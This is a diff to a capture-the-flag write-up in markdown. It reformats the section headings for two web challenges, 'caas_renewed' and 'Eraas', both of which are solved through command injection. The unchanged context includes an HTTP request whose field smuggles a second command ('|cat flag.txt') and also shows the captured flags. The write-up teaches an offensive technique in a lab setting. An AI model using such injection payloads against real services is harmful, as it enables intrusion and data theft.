@@ -6,8 +6,10 @@ date: 2023-12-18
 author: Duc Anh Nguyen
 ---
 
+## Web
+<div style="border-bottom: 3px solid grey;"></div>
 
-## [Web: caas_renewed](http://caas.web.nitectf.live)
+### **[caas_renewed](http://caas.web.nitectf.live)**
 There is a cowsay service running, it takes user input from the `GET URL: /cowsay/{input}`. Cleary there is a command injection vulnerability. But there are some filters and also restrictions for the input, I was able to extract the source code of the server using the following payload:
 
 ```http
@@ -191,9 +193,10 @@ Connection: close
 Content-Length: 2
 ```
 
-**Flag:**
 
 ```http
+Flag:
+
 HTTP/1.1 200 OK
 date: Mon, 18 Dec 2023 10:04:21 GMT
 content-length: 180
@@ -211,7 +214,8 @@ Connection: close
 nite{9wd_t0_th3_r35cu3_dp54kf_ud9j3od3w}
 ```
 
-# [Web: Eraas](!http://eraas.web.nitectf.live/)
+
+### [Eraas](!http://eraas.web.nitectf.live/)
 Command injection in user input:
 
 ```http
@@ -232,6 +236,6 @@ Connection: close
 user_input=1745291415|cat flag.txt
 ```
 
-Flag:
+**Flag:**
 `nite{b3tt3r_n0_c5p_th7n_b7d_c5p_r16ht_fh8w4d}`
 
